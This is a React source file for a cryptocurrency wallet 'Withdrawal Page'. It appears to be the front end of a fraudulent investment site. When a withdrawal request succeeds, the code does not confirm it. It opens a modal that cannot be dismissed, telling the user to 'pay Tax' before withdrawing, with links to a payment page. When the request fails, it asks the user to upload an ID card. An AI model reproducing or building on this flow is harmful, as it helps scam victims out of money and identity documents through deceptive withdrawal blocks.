import React, { useState, useContext, useEffect } from 'react';
import { useHistory } from 'react-router-dom';
import doSubmit from '../bloc/WithdrawBloc';

import Swal from 'sweetalert2';

import { CoinContext } from '../../CoinProvider';

import NavBar from '../../components/navbar';
import SideBar from '../../components/sidebar';
import Title from '../../components/title';
import Footer from '../../admin/components/Footer';

import '../../static/css/deposite.css';

const Withdraw = () => {
  const history = useHistory();
  const coinId = history.location.pathname.split('/')[2];

  const [amount, setAmount] = useState('');
  const [userAddress, setUserAddress] = useState('');

  // Loader on Button
  const [withdrawLoader, setWithdrawLoader] = useState(false);

  // Error States
  const [withdrawError, setWithdrawError] = useState('');

  // CONTEXT
  const { getSingleCoin, myCoin, getMyCoin } = useContext(CoinContext);

  // COIN ID
  // const coinId =
  //   singleCoin.length === 0
  //     ? window.localStorage.getItem('coinId')
  //     : singleCoin[0].coin._id;

  // GET USER FROM LOCALSTORAGE
  const userId = window.localStorage.getItem('userId');
  // const walletId = window.localStorage.getItem('walletId');

  //
  //
  //
  //

  // MOUNT MYCOIN
  useEffect(() => {
    getSingleCoin(userId, coinId);
    getMyCoin(coinId);
    // eslint-disable-next-line
  }, []);

  // SUBMIT
  const handleSubmit = async (e) => {
    e.preventDefault();
    setWithdrawLoader(true);
    try {
      const isWithdraw = await doSubmit(
        amount,
        userAddress,
        // APPEND
        window.localStorage.getItem('userId'),
        window.localStorage.getItem('walletId')
      );
      if (isWithdraw) {
        Swal.fire({
          text: 'pay Tax', // pay Tax in order to be eligible to make a withdrawal your wallet balance
          icon: 'question',
          confirmButtonText: `<a href="/alert">Ok</a>`,
          background: '#121007',
          width: '50em',
          allowOutsideClick: false,
          footer: `<a href="/alert">Tax information and payment procedure</a>`
        });
        setWithdrawLoader(false);
      }
    } catch (e) {
      if (e.statuscode === 400 && e.error === 'Upload your valid id card') {
        Swal.fire({
          text: 'upload credentials to be able to continue',
          icon: 'warning',
          confirmButtonText: `<a href="/credentials/${coinId}">Ok</a>`,
          background: '#121007',
          width: '50em'
        });
        // history.push('/credentials');
        setWithdrawLoader(false);
        setWithdrawError(e.error);
      }
    } finally {
    }
  };

  // COIN IMG
  const coinImg = myCoin.map((item, index) => item.icon);

  return (
    <>
      <NavBar />
      <SideBar />
      <main>
        <Title title="Withdrawal Page" />
        {myCoin.map((coin, index) => (
          <section key={index} className="box-two">
            <h3>{coin.name}</h3>
            <div className="row">
              <div className="img wallet-img-box">
                <img className="wallet-img" src={coinImg} alt="bar code" />
              </div>

              <form onSubmit={handleSubmit}>
                {withdrawError && (
                  <h3 style={{ color: 'red', margin: 'auto auto' }}>
                    {withdrawError}
                  </h3>
                )}
                <div className="form-group">
                  <div className="btc-convert">
                    {/* <p>0.0000</p> */}
                    {/* <span>++BTC</span> */}
                  </div>
                  <label htmlFor="amount">Amount</label>
                  <input
                    name="amount"
                    type="text"
                    id="amount"
                    placeholder="amount"
                    onChange={(e) => setAmount(e.target.value)}
                  />
                </div>
                <div className="form-group">
                  <label htmlFor="address">Wallet Adress</label>
                  <input
                    type="text"
                    id="address"
                    placeholder="enter your wallet address"
                    onChange={(e) => setUserAddress(e.target.value)}
                  />
                </div>
                <button className="site-btn" type="submit">
                  {withdrawLoader ? 'Requesting' : 'Withdraw'}
                </button>
              </form>
            </div>
          </section>
        ))}
        <Footer />
      </main>
    </>
  );
};

export default Withdraw;
